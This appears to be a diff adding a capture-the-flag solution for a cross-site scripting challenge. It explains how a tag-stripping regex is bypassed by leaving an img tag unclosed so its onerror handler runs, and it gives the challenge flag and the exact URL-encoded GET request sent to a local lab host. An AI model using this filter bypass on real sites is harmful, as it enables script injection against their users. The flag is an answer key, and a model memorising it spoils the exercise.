@@ -1,0 +1,4 @@
+# XSS filter bypass via unclosed HTML tag. The regex filter <[^>]*> requires a closing > to strip tags. By omitting the closing >, the img tag with onerror handler bypasses the filter and executes alert('XSS'). FLAG: flag{9e5f344a-0906-4866-bc8c-7cdf2163f9d3}
+
+GET /page?name=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29 HTTP/1.1
+Host: 172.17.0.1:54963
